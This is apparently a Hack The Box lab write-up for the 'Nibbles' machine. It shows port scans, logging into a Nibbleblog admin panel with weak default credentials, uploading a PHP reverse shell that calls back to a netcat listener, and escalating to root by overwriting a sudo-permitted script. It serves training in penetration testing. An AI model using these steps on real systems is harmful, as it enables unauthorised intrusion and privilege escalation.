# Hackthebox Nibbles

First reset the machine.

## Enumeration

First do the standard portscanning of every tcp port on the system.

```
$ sudo nmap -A -T4 -p- 10.10.10.75                                                                                                                              130 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-22 10:34 EST
Nmap scan report for 10.10.10.75
Host is up (0.035s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.2 - 4.9 (95%), Linux 3.8 - 3.11 (95%), Linux 4.8 (95%), Linux 4.4 (95%), Linux 4.9 (95%), Linux 3.16 (95%), Linux 3.18 (95%), Linux 4.2 (95%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Since we have a web server, run Nikto and Gobuster

```
$ nikto -h 10.10.10.75                                                                                                                                            1 ⨯
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.75
+ Target Hostname:    10.10.10.75
+ Target Port:        80
+ Start Time:         2021-12-22 10:35:57 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Server may leak inodes via ETags, header found with file /, inode: 5d, size: 5616c3cf7fa77, mtime: gzip
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7863 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2021-12-22 10:41:35 (GMT-5) (338 seconds)
---------------------------------------------------------------------------
```


Opening up the source code of the simplistic front page reveals a comment

```
!-- /nibbleblog/ directory. Nothing interesting here! -->
```

And with that information it is possible to open up the directory /nibbleblog.

Nibbleblog can be found from github: https://github.com/dignajar/nibbleblog. Both admin.php and install.php exist, and admin.php is protected with very weak username and password. The username admin can be confirmed from install.php, and the password is just nibbles.

## Vulnerability analysis

## Admin panel

First confirm the vulnerable plugin "My image" is activated, which it is. Upload standard php reverse shell through the admin panel, and it ends up as a file nibbleblog/content/private/plugins/my_image/image.php. 

Open up listener and call the image.php

```
$ nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.10.75] 50780
Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 12:27:17 up 55 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
nibbler


$ pwd
/home/nibbler
$ ls -al
total 20
drwxr-xr-x 3 nibbler nibbler 4096 Dec 29  2017 .
drwxr-xr-x 3 root    root    4096 Dec 10  2017 ..
-rw------- 1 nibbler nibbler    0 Dec 29  2017 .bash_history
drwxrwxr-x 2 nibbler nibbler 4096 Dec 10  2017 .nano
-r-------- 1 nibbler nibbler 1855 Dec 10  2017 personal.zip
-r-------- 1 nibbler nibbler   33 Dec 23 11:32 user.txt
```

Grab the flag, and continue to privilege escalation.

## Privile escalation

First thing to do is to look at the personal.zip file

```
$ unzip personal.zip
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh
```

The script is for server monitoring. There is a high likelihood we will bump in to it soon.

Indeed, our user can execute the script as an admin.

```
$ sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

Upgrade the shell and get going.

```
$ python3 -c "import pty; pty.spawn('/bin/bash');"
nibbler@Nibbles:/home/nibbler/personal/stuff$
```

Next confirm we really can run the files as root, and capture the flag first by listing the root directory and next capturing the flag

```
nibbler@Nibbles:/home/nibbler/personal/stuff$ echo "#! /bin/bash" > monitor.sh
<er/personal/stuff$ echo "#! /bin/bash" > monitor.sh                         
nibbler@Nibbles:/home/nibbler/personal/stuff$ echo "ls -al /root" >> monitor.sh
<er/personal/stuff$ echo "ls -al /root" >> monitor.sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo -u root /home/nibbler/personal/stuff/monitor.sh
<er/personal/stuff$ sudo -u root /home/nibbler/personal/stuff/monitor.sh     
total 32
drwx------  4 root root 4096 Dec 15  2020 .
drwxr-xr-x 23 root root 4096 Dec 15  2020 ..
-rw-------  1 root root    0 Dec 29  2017 .bash_history
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwx------  2 root root 4096 Dec 10  2017 .cache
drwxr-xr-x  2 root root 4096 Dec 10  2017 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-------  1 root root 1091 Dec 15  2020 .viminfo
-r--------  1 root root   33 Dec 23 11:32 root.txt
ibbler@Nibbles:/home/nibbler/personal/stuff$ echo "#! /bin/bash" > monitor.sh
<er/personal/stuff$ echo "#! /bin/bash" > monitor.sh                         
nibbler@Nibbles:/home/nibbler/personal/stuff$ echo "cat /root/root.txt" > monitor.sh
<er/personal/stuff$ echo "cat /root/root.txt" > monitor.sh                   
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo -u root /home/nibbler/personal/stuff/monitor.sh
<er/personal/stuff$ sudo -u root /home/nibbler/personal/stuff/monitor.sh     
cc88b63...
```

Note the full directory path must be given to be able to run the script as root without the password.

Even better way by achieving root shell

```
nibbler@Nibbles:/home/nibbler/personal/stuff$ echo "sh" > monitor.sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh
sudo /home/nibbler/personal/stuff/monitor.sh
# whoami
whoami
root
#
